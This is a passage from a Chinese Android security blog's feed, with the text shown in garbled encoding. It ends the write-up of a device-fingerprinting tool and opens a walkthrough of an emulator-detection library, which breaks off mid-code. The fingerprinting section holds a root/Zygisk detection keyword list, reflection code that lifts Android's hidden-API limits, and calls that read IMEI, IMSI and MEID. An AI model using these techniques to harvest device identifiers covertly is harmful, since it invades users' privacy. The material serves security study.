Name</code></td><td>ç³»ç»Ÿåç§°</td><td><code>uname(&amp;info)</code> -&gt; <code>info.sysname</code></td></tr><tr><td><code>Node Name</code></td><td>èŠ‚ç‚¹åç§°</td><td><code>uname(&amp;info)</code> -&gt; <code>info.nodename</code></td></tr><tr><td><code>Release</code></td><td>å†…æ ¸ç‰ˆæœ¬</td><td><code>uname(&amp;info)</code> -&gt; <code>info.release</code></td></tr><tr><td><code>Version</code></td><td>å†…æ ¸ç‰ˆæœ¬è¯¦ç»†ä¿¡æ¯</td><td><code>uname(&amp;info)</code> -&gt; <code>info.version</code></td></tr><tr><td><code>Machine</code></td><td>æœºå™¨æ¶æ„</td><td><code>uname(&amp;info)</code> -&gt; <code>info.machine</code></td></tr><tr><td><code>Domain Name</code></td><td>åŸŸå</td><td><code>uname(&amp;info)</code> -&gt; <code>info.domainname</code> (GNU)</td></tr></tbody></table><p><strong>Native API è°ƒç”¨</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">utsname</span> info;</span><br><span class="line"><span class="built_in">uname</span>(&amp;info);</span><br></pre></td></tr></table></figure><h4 id="ç³»ç»Ÿé…ç½®ä¿¡æ¯ï¼ˆé€šè¿‡-sysconfï¼‰"><a href="#ç³»ç»Ÿé…ç½®ä¿¡æ¯ï¼ˆé€šè¿‡-sysconfï¼‰" class="headerlink" title="ç³»ç»Ÿé…ç½®ä¿¡æ¯ï¼ˆé€šè¿‡ sysconfï¼‰"></a>ç³»ç»Ÿé…ç½®ä¿¡æ¯ï¼ˆé€šè¿‡ sysconfï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>Native API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>CPU Cores (Online)</code></td><td>åœ¨çº¿ CPU æ ¸å¿ƒæ•°</td><td><code>sysconf(_SC_NPROCESSORS_ONLN)</code></td></tr><tr><td><code>CPU Cores (Configured)</code></td><td>é…ç½®çš„ CPU æ ¸å¿ƒæ•°</td><td><code>sysconf(_SC_NPROCESSORS_CONF)</code></td></tr><tr><td><code>Page Size</code></td><td>é¡µå¤§å°ï¼ˆå­—èŠ‚ï¼‰</td><td><code>sysconf(_SC_PAGESIZE)</code></td></tr><tr><td><code>Clock Ticks per Second</code></td><td>æ¯ç§’æ—¶é’Ÿæ»´ç­”æ•°</td><td><code>sysconf(_SC_CLK_TCK)</code></td></tr><tr><td><code>Physical Pages</code></td><td>ç‰©ç†é¡µæ•°</td><td><code>sysconf(_SC_PHYS_PAGES)</code></td></tr><tr><td><code>Total Physical Memory</code></td><td>æ€»ç‰©ç†å†…å­˜ï¼ˆMBï¼‰</td><td><code>phys_pages * page_size / 1024 / 1024</code></td></tr><tr><td><code>Available Physical Pages</code></td><td>å¯ç”¨ç‰©ç†é¡µæ•°</td><td><code>sysconf(_SC_AVPHYS_PAGES)</code></td></tr><tr><td><code>Available Physical Memory</code></td><td>å¯ç”¨ç‰©ç†å†…å­˜ï¼ˆMBï¼‰</td><td><code>avphys_pages * page_size / 1024 / 1024</code></td></tr></tbody></table><p><strong>Native API è°ƒç”¨</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> nproc = <span class="built_in">sysconf</span>(_SC_NPROCESSORS_ONLN);</span><br><span class="line"><span class="type">long</span> page_size = <span class="built_in">sysconf</span>(_SC_PAGESIZE);</span><br><span class="line"><span class="type">long</span> phys_pages = <span class="built_in">sysconf</span>(_SC_PHYS_PAGES);</span><br></pre></td></tr></table></figure><h4 id="Zygisk-æ³¨å…¥æ£€æµ‹"><a href="#Zygisk-æ³¨å…¥æ£€æµ‹" class="headerlink" title="Zygisk æ³¨å…¥æ£€æµ‹"></a>Zygisk æ³¨å…¥æ£€æµ‹</h4><p>é€šè¿‡è¯»å– <code>/proc/self/maps</code> æ£€æµ‹å¯ç–‘åº“æ³¨å…¥ï¼š</p><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>Total Mappings</code></td><td>æ€»æ˜ å°„æ•°</td></tr><tr><td><code>Library Mappings</code></td><td>åº“æ˜ å°„æ•°</td></tr><tr><td><code>Suspicious Libraries Found</code></td><td>æ£€æµ‹åˆ°çš„å¯ç–‘åº“æ•°é‡</td></tr><tr><td><code>Suspicious Libraries</code></td><td>å¯ç–‘åº“åˆ—è¡¨</td></tr></tbody></table><p><strong>æ£€æµ‹çš„å¯ç–‘å…³é”®è¯</strong>ï¼š</p><ul><li><code>magisk</code></li><li><code>zygisk</code></li><li><code>riru</code></li><li><code>lsposed</code></li><li><code>edxposed</code></li><li><code>xposed</code></li><li><code>/data/local/tmp/</code></li><li><code>/data/adb/</code></li><li><code>/sbin/</code></li><li><code>/dev/</code></li></ul><h2 id="ğŸ”“-Hidden-API-è°ƒç”¨è¯¦æƒ…"><a href="#ğŸ”“-Hidden-API-è°ƒç”¨è¯¦æƒ…" class="headerlink" title="ğŸ”“ Hidden API è°ƒç”¨è¯¦æƒ…"></a>ğŸ”“ Hidden API è°ƒç”¨è¯¦æƒ…</h2><h3 id="1-Hidden-API-è§£é™¤é™åˆ¶"><a href="#1-Hidden-API-è§£é™¤é™åˆ¶" class="headerlink" title="1. Hidden API è§£é™¤é™åˆ¶"></a>1. Hidden API è§£é™¤é™åˆ¶</h3><p>é¡¹ç›®ä½¿ç”¨ <code>FreeReflection</code> åº“è§£é™¤ Android Hidden API é™åˆ¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FuckHideApi.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FuckHideApi</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">attachBaseContext</span><span class="params">(Context base)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.attachBaseContext(base);</span><br><span class="line">        Reflection.unseal(base);  <span class="comment">// è§£é™¤ Hidden API é™åˆ¶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¾èµ–</strong>ï¼š<code>com.github.tiann:FreeReflection:3.2.0</code></p><h3 id="2-TelephonyManager-Hidden-API"><a href="#2-TelephonyManager-Hidden-API" class="headerlink" title="2. TelephonyManager Hidden API"></a>2. TelephonyManager Hidden API</h3><table><thead><tr><th>æ–¹æ³•å</th><th>å‚æ•°</th><th>è¯´æ˜</th><th>è°ƒç”¨æ–¹å¼</th></tr></thead><tbody><tr><td><code>getMeid()</code></td><td>æ— </td><td>è·å– MEID</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getMeid&quot;)</code></td></tr><tr><td><code>getNai()</code></td><td>æ— </td><td>è·å– NAI</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getNai&quot;)</code></td></tr><tr><td><code>getDataNetworkType()</code></td><td>æ— </td><td>è·å–æ•°æ®ç½‘ç»œç±»å‹</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getDataNetworkType&quot;)</code></td></tr><tr><td><code>getPhoneCount()</code></td><td>æ— </td><td>è·å–ç”µè¯æ•°é‡</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getPhoneCount&quot;)</code></td></tr><tr><td><code>getActiveModemCount()</code></td><td>æ— </td><td>è·å–æ´»åŠ¨è°ƒåˆ¶è§£è°ƒå™¨æ•°é‡</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getActiveModemCount&quot;)</code> (Android 11+)</td></tr><tr><td><code>getImei(int slotIndex)</code></td><td><code>int slotIndex</code></td><td>è·å–æŒ‡å®šå¡æ§½çš„ IMEI</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getImei&quot;, int.class)</code></td></tr><tr><td><code>getDeviceId(int slotIndex)</code></td><td><code>int slotIndex</code></td><td>è·å–æŒ‡å®šå¡æ§½çš„è®¾å¤‡ ID</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getDeviceId&quot;, int.class)</code></td></tr><tr><td><code>getMeid(int slotIndex)</code></td><td><code>int slotIndex</code></td><td>è·å–æŒ‡å®šå¡æ§½çš„ MEID</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getMeid&quot;, int.class)</code></td></tr><tr><td><code>getSubscriberId(int subId)</code></td><td><code>int subId</code></td><td>è·å–æŒ‡å®šè®¢é˜… ID çš„ IMSI</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getSubscriberId&quot;, int.class)</code></td></tr><tr><td><code>getCarrierConfig()</code></td><td>æ— </td><td>è·å–è¿è¥å•†é…ç½®</td><td><code>TelephonyManager.class.getDeclaredMethod(&quot;getCarrierConfig&quot;)</code></td></tr></tbody></table><h3 id="3-SystemProperties-Hidden-API"><a href="#3-SystemProperties-Hidden-API" class="headerlink" title="3. SystemProperties Hidden API"></a>3. SystemProperties Hidden API</h3><table><thead><tr><th>æ–¹æ³•å</th><th>å‚æ•°</th><th>è¯´æ˜</th><th>è°ƒç”¨æ–¹å¼</th></tr></thead><tbody><tr><td><code>get(String key, String defaultValue)</code></td><td><code>String key, String defaultValue</code></td><td>è·å–å­—ç¬¦ä¸²å±æ€§</td><td><code>SystemProperties.class.getMethod(&quot;get&quot;, String.class, String.class)</code></td></tr><tr><td><code>getLong(String key, long defaultValue)</code></td><td><code>String key, long defaultValue</code></td><td>è·å–é•¿æ•´å‹å±æ€§</td><td><code>SystemProperties.class.getMethod(&quot;getLong&quot;, String.class, long.class)</code></td></tr><tr><td><code>getInt(String key, int defaultValue)</code></td><td><code>String key, int defaultValue</code></td><td>è·å–æ•´å‹å±æ€§</td><td><code>SystemProperties.class.getMethod(&quot;getInt&quot;, String.class, int.class)</code></td></tr><tr><td><code>getBoolean(String key, boolean defaultValue)</code></td><td><code>String key, boolean defaultValue</code></td><td>è·å–å¸ƒå°”å‹å±æ€§</td><td><code>SystemProperties.class.getMethod(&quot;getBoolean&quot;, String.class, boolean.class)</code></td></tr></tbody></table><h3 id="4-ActivityManager-MemoryInfo-Hidden-å­—æ®µ"><a href="#4-ActivityManager-MemoryInfo-Hidden-å­—æ®µ" class="headerlink" title="4. ActivityManager.MemoryInfo Hidden å­—æ®µ"></a>4. ActivityManager.MemoryInfo Hidden å­—æ®µ</h3><table><thead><tr><th>å­—æ®µå</th><th>ç±»å‹</th><th>è¯´æ˜</th><th>è®¿é—®æ–¹å¼</th></tr></thead><tbody><tr><td><code>hiddenAppThreshold</code></td><td><code>long</code></td><td>éšè—åº”ç”¨é˜ˆå€¼</td><td><code>MemoryInfo.class.getDeclaredField(&quot;hiddenAppThreshold&quot;)</code></td></tr><tr><td><code>secondaryServerThreshold</code></td><td><code>long</code></td><td>äºŒçº§æœåŠ¡å™¨é˜ˆå€¼</td><td><code>MemoryInfo.class.getDeclaredField(&quot;secondaryServerThreshold&quot;)</code></td></tr></tbody></table><h3 id="5-ActivityManager-Hidden-æ–¹æ³•"><a href="#5-ActivityManager-Hidden-æ–¹æ³•" class="headerlink" title="5. ActivityManager Hidden æ–¹æ³•"></a>5. ActivityManager Hidden æ–¹æ³•</h3><table><thead><tr><th>æ–¹æ³•å</th><th>å‚æ•°</th><th>è¯´æ˜</th><th>è°ƒç”¨æ–¹å¼</th></tr></thead><tbody><tr><td><code>getMemoryInfo(int uid, MemoryInfo outInfo)</code></td><td><code>int uid, MemoryInfo outInfo</code></td><td>è·å–æŒ‡å®š UID çš„å†…å­˜ä¿¡æ¯</td><td><code>ActivityManager.class.getDeclaredMethod(&quot;getMemoryInfo&quot;, int.class, ActivityManager.MemoryInfo.class)</code></td></tr></tbody></table><h3 id="6-ContentResolver-Hidden-API"><a href="#6-ContentResolver-Hidden-API" class="headerlink" title="6. ContentResolver Hidden API"></a>6. ContentResolver Hidden API</h3><table><thead><tr><th>æ–¹æ³•å</th><th>å‚æ•°</th><th>è¯´æ˜</th><th>è°ƒç”¨æ–¹å¼</th></tr></thead><tbody><tr><td><code>call(Uri uri, String method, String arg, Bundle extras)</code></td><td><code>Uri uri, String method, String arg, Bundle extras</code></td><td>è°ƒç”¨ ContentProvider æ–¹æ³•</td><td><code>ContentResolver.call(Uri.parse(&quot;content://settings/secure&quot;), &quot;GET_secure&quot;, &quot;android_id&quot;, Bundle)</code></td></tr></tbody></table><h2 id="ğŸš€-ä½¿ç”¨æ–¹æ³•"><a href="#ğŸš€-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ğŸš€ ä½¿ç”¨æ–¹æ³•"></a>ğŸš€ ä½¿ç”¨æ–¹æ³•</h2><h3 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–æœåŠ¡</span></span><br><span class="line"><span class="type">FingerprintService</span> <span class="variable">fingerprintService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FingerprintService</span>(context);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡‡é›† Java å±‚æŒ‡çº¹</span></span><br><span class="line"><span class="type">FingerprintResult</span> <span class="variable">javaResult</span> <span class="operator">=</span> fingerprintService.collectJavaFingerprint();</span><br><span class="line"><span class="type">String</span> <span class="variable">javaOutput</span> <span class="operator">=</span> javaResult.toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡‡é›† Native å±‚æŒ‡çº¹</span></span><br><span class="line"><span class="type">FingerprintResult</span> <span class="variable">nativeResult</span> <span class="operator">=</span> fingerprintService.collectNativeFingerprint();</span><br><span class="line"><span class="type">String</span> <span class="variable">nativeOutput</span> <span class="operator">=</span> nativeResult.toNativeString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ¸…æ´—åçš„ Java å±‚æŒ‡çº¹ï¼ˆJSON æ ¼å¼ï¼‰</span></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">cleanedJavaData</span> <span class="operator">=</span> fingerprintService.collectAndCleanJavaFingerprint();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ¸…æ´—åçš„å®Œæ•´æŒ‡çº¹ï¼ˆåŒ…æ‹¬ Java å’Œ Native å±‚ï¼‰</span></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">cleanedAllData</span> <span class="operator">=</span> fingerprintService.collectAndCleanAllFingerprint();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å– MAC åœ°å€ï¼ˆNative å±‚ï¼‰</span></span><br><span class="line"><span class="type">String</span> <span class="variable">macAddress</span> <span class="operator">=</span> fingerprintService.getMacAddress();</span><br></pre></td></tr></table></figure><h3 id="å•ç‹¬ä½¿ç”¨æŸä¸ªé‡‡é›†å™¨"><a href="#å•ç‹¬ä½¿ç”¨æŸä¸ªé‡‡é›†å™¨" class="headerlink" title="å•ç‹¬ä½¿ç”¨æŸä¸ªé‡‡é›†å™¨"></a>å•ç‹¬ä½¿ç”¨æŸä¸ªé‡‡é›†å™¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åªé‡‡é›† Settings ä¿¡æ¯</span></span><br><span class="line"><span class="type">SettingsCollector</span> <span class="variable">settingsCollector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SettingsCollector</span>(context);</span><br><span class="line"><span class="type">String</span> <span class="variable">settings</span> <span class="operator">=</span> settingsCollector.collectSettings();</span><br><span class="line"><span class="type">String</span> <span class="variable">androidId</span> <span class="operator">=</span> settingsCollector.getAndroidId();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åªé‡‡é›†ç”µè¯ä¿¡æ¯</span></span><br><span class="line"><span class="type">PhoneInfoCollector</span> <span class="variable">phoneInfoCollector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PhoneInfoCollector</span>(context);</span><br><span class="line"><span class="type">String</span> <span class="variable">phoneInfo</span> <span class="operator">=</span> phoneInfoCollector.getPhoneInfo();</span><br></pre></td></tr></table></figure><h2 id="ğŸ“¦-ä¾èµ–é¡¹"><a href="#ğŸ“¦-ä¾èµ–é¡¹" class="headerlink" title="ğŸ“¦ ä¾èµ–é¡¹"></a>ğŸ“¦ ä¾èµ–é¡¹</h2><h3 id="Gradle-ä¾èµ–"><a href="#Gradle-ä¾èµ–" class="headerlink" title="Gradle ä¾èµ–"></a>Gradle ä¾èµ–</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.6.1&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;com.google.android.material:material:1.9.0&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;androidx.constraintlayout:constraintlayout:2.1.4&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;com.github.tiann:FreeReflection:3.2.0&#x27;</span>  <span class="comment">// Hidden API è§£é™¤é™åˆ¶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Native-ä¾èµ–"><a href="#Native-ä¾èµ–" class="headerlink" title="Native ä¾èµ–"></a>Native ä¾èµ–</h3><ul><li>Android NDK</li><li>CMake 3.22.1+</li><li>C++ æ ‡å‡†åº“</li><li>Android Media NDK (ç”¨äº DRM)</li></ul><h2 id="âš™ï¸-æ„å»ºè¦æ±‚"><a href="#âš™ï¸-æ„å»ºè¦æ±‚" class="headerlink" title="âš™ï¸ æ„å»ºè¦æ±‚"></a>âš™ï¸ æ„å»ºè¦æ±‚</h2><ul><li><strong>ç¼–è¯‘ SDK</strong>ï¼š35</li><li><strong>æœ€å° SDK</strong>ï¼š33</li><li><strong>ç›®æ ‡ SDK</strong>ï¼š35</li><li><strong>Java ç‰ˆæœ¬</strong>ï¼š11</li><li><strong>NDK ç‰ˆæœ¬</strong>ï¼šæœ€æ–°ç¨³å®šç‰ˆ</li><li><strong>CMake ç‰ˆæœ¬</strong>ï¼š3.22.1</li></ul><h2 id="ğŸ“-æƒé™è¦æ±‚"><a href="#ğŸ“-æƒé™è¦æ±‚" class="headerlink" title="ğŸ“ æƒé™è¦æ±‚"></a>ğŸ“ æƒé™è¦æ±‚</h2><p>éƒ¨åˆ†åŠŸèƒ½éœ€è¦ä»¥ä¸‹æƒé™ï¼ˆåœ¨ <code>AndroidManifest.xml</code> ä¸­å£°æ˜ï¼‰ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ç”µè¯ä¿¡æ¯ï¼ˆAndroid 8.0+ï¼‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- è´¦æˆ·ä¿¡æ¯ï¼ˆAndroid 6.0+ï¼‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.GET_ACCOUNTS&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- è“ç‰™ä¿¡æ¯ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.BLUETOOTH&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.BLUETOOTH_ADMIN&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šAndroid 10+ å¯¹æŸäº›æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ IMEIï¼‰çš„è®¿é—®æœ‰ä¸¥æ ¼é™åˆ¶ï¼Œæ™®é€šåº”ç”¨å¯èƒ½æ— æ³•è·å–ã€‚</p><h2 id="ğŸ”’-å®‰å…¨æ³¨æ„äº‹é¡¹"><a href="#ğŸ”’-å®‰å…¨æ³¨æ„äº‹é¡¹" class="headerlink" title="ğŸ”’ å®‰å…¨æ³¨æ„äº‹é¡¹"></a>ğŸ”’ å®‰å…¨æ³¨æ„äº‹é¡¹</h2><ol><li><strong>Hidden API ä½¿ç”¨</strong>ï¼šé¡¹ç›®ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨ Hidden APIï¼Œå¯èƒ½åœ¨ä¸åŒ Android ç‰ˆæœ¬ä¸Šè¡¨ç°ä¸ä¸€è‡´</li><li><strong>æƒé™é™åˆ¶</strong>ï¼šAndroid 10+ å¯¹è®¾å¤‡æ ‡è¯†ç¬¦è®¿é—®æœ‰ä¸¥æ ¼é™åˆ¶ï¼Œéƒ¨åˆ†ä¿¡æ¯å¯èƒ½æ— æ³•è·å–</li><li><strong>éšç§ä¿æŠ¤</strong>ï¼šé‡‡é›†çš„è®¾å¤‡æŒ‡çº¹ä¿¡æ¯å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼Œè¯·å¦¥å–„å¤„ç†</li><li><strong>Root æ£€æµ‹</strong>ï¼šé¡¹ç›®åŒ…å« Root å’Œ Zygisk æ³¨å…¥æ£€æµ‹åŠŸèƒ½ï¼Œå¯ç”¨äºå®‰å…¨åˆ†æ</li></ol><h2 id="ğŸ“„-è®¸å¯è¯"><a href="#ğŸ“„-è®¸å¯è¯" class="headerlink" title="ğŸ“„ è®¸å¯è¯"></a>ğŸ“„ è®¸å¯è¯</h2><p>æœ¬é¡¹ç›®ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ã€‚</p><h2 id="ğŸ¤-è´¡çŒ®"><a href="#ğŸ¤-è´¡çŒ®" class="headerlink" title="ğŸ¤ è´¡çŒ®"></a>ğŸ¤ è´¡çŒ®</h2><p>æ¬¢è¿æäº¤ Issue å’Œ Pull Requestã€‚</p><h2 id="ğŸ“§-è”ç³»æ–¹å¼"><a href="#ğŸ“§-è”ç³»æ–¹å¼" class="headerlink" title="ğŸ“§ è”ç³»æ–¹å¼"></a>ğŸ“§ è”ç³»æ–¹å¼</h2><p>å¦‚æœ‰é—®é¢˜æˆ–å»ºè®®ï¼Œè¯·é€šè¿‡ Issue åé¦ˆã€‚</p><hr><p><strong>æ³¨æ„</strong>ï¼šæœ¬é¡¹ç›®ä»…ç”¨äºåˆæ³•çš„å®‰å…¨ç ”ç©¶å’Œè®¾å¤‡è¯†åˆ«ç›®çš„ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;spHunter-Android-è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·&quot;&gt;&lt;a href=&quot;#spHunter-Android-è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·&quot; class=&quot;headerlink&quot; title=&quot;spHunter - Android è®¾å¤‡æŒ‡çº¹é‡‡é›†å·¥å…·&quot;&gt;&lt;/a&gt;spHunter </summary>
      
    
    
    
    <category term="å®‰å“é£æ§" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%A3%8E%E6%8E%A7/"/>
    
    
    <category term="é£æ§" scheme="http://s1nec-1o.github.io/tags/%E9%A3%8E%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>Androidé€†å‘ä»å…¥é—¨åˆ°å…¥åœŸä¹‹AntiFakerAndroidChecker(3)</title>
    <link href="http://s1nec-1o.github.io/2025/11/03/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8BAntiFakerAndroidChecker/"/>
    <id>http://s1nec-1o.github.io/2025/11/03/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8BAntiFakerAndroidChecker/</id>
    <published>2025-11-03T13:26:59.000Z</published>
    <updated>2025-11-03T13:41:08.342Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡çš„é¡¹ç›®æ¥è‡ªäº<a href="https://github.com/happylishang/AntiFakerAndroidChecker/">https://github.com/happylishang/AntiFakerAndroidChecker/</a></p><h2 id="æ¨¡æ‹Ÿå™¨æ£€æµ‹"><a href="#æ¨¡æ‹Ÿå™¨æ£€æµ‹" class="headerlink" title="æ¨¡æ‹Ÿå™¨æ£€æµ‹"></a>æ¨¡æ‹Ÿå™¨æ£€æµ‹</h2><h3 id="MainActivity-java"><a href="#MainActivity-java" class="headerlink" title="MainActivity.java"></a>MainActivity.java</h3><p>åœ¨demoä¸­å±•ç¤ºçš„å°±æ˜¯æ£€æµ‹æ¨¡æ‹Ÿå™¨çš„ä»£ç </p><h3 id="onCreate"><a href="#onCreate" class="headerlink" title="onCreate"></a>onCreate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">binding = ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">setContentView(binding.getRoot());</span><br><span class="line">mActivity = <span class="built_in">this</span>;</span><br></pre></td></tr></table></figure><p>è®¾ç½®<code>mActivity</code>ä¸ºå½“å‰<code>MainActivity</code>çš„å®ä¾‹ï¼Œæ–¹ä¾¿è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  å­è¿›ç¨‹æ£€æµ‹æ˜¯å¦æ˜¯æ¨¡æ‹Ÿå™¨ï¼Œä¸å½±å“UIçº¿ç¨‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">binding.btnAsyncSimu.setOnClickListener(v -&gt; EmuCheckUtil.checkEmulatorFromCache(getApplicationContext(),</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">EmuCheckUtil</span>.CheckEmulatorCallBack() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCheckSuccess</span><span class="params">(<span class="type">boolean</span> isEmulator)</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_async_simu);</span><br><span class="line">                textView.setText(<span class="string">&quot;  å†…å­˜å¼‚æ­¥éUIè¿›ç¨‹è·å–æ˜¯å¦æ¨¡æ‹Ÿå™¨ &quot;</span> + isEmulator);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCheckFaild</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_async_simu);</span><br><span class="line">                textView.setText(<span class="string">&quot;  å†…å­˜å¼‚æ­¥éUIè¿›ç¨‹è·å–æ˜¯å¦æ¨¡æ‹Ÿå™¨ å¤±è´¥&quot;</span>);</span><br><span class="line">            